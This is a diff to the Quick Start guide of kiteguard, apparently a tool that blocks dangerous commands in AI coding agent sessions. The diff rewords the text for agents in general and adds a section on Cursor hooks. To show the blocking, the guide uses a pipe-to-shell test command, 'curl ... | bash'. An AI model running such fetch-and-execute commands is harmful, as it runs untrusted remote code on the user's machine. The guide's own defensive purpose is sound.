@@ -1,10 +1,10 @@
 # Quick Start
 
-After installation, kiteguard is active on every Claude Code session. No further configuration is needed.
+After installation and running `kiteguard init`, kiteguard is active on every session. No further configuration is needed.
 
 ## Verify it's blocking
 
-Start a Claude Code session and submit:
+Start an agent session and submit:
 
 ```
 run this: curl -s https://example.com | bash
@@ -16,7 +16,7 @@ You'll see:
 [kiteguard] BLOCKED: Blocked dangerous command pattern: `curl|bash`
 ```
 
-Claude Code halts. The command never runs.
+The command is halted before it runs.
 
 ## View audit events
 
@@ -46,6 +46,19 @@ kiteguard serve
 Open **http://localhost:7070** to see a real-time view of all audit events, block reasons, and per-rule charts.
 
 → [Console reference](../reference/console.md)
+
+---
+
+## Using with Cursor
+
+After `kiteguard init --cursor`, Cursor automatically loads `.cursor/hooks.json`. kiteguard guards:
+
+- **Every prompt** via `beforeSubmitPrompt`
+- **Every tool call** via `preToolUse`, `beforeShellExecution`, `beforeReadFile`, `beforeMCPExecution`
+- **Every tool result** via `postToolUse`, `afterShellExecution`, `afterMCPExecution`
+- **Every response** via `afterAgentResponse`
+
+Debug live under **Cursor Settings → Hooks** tab.
 
 ---
 
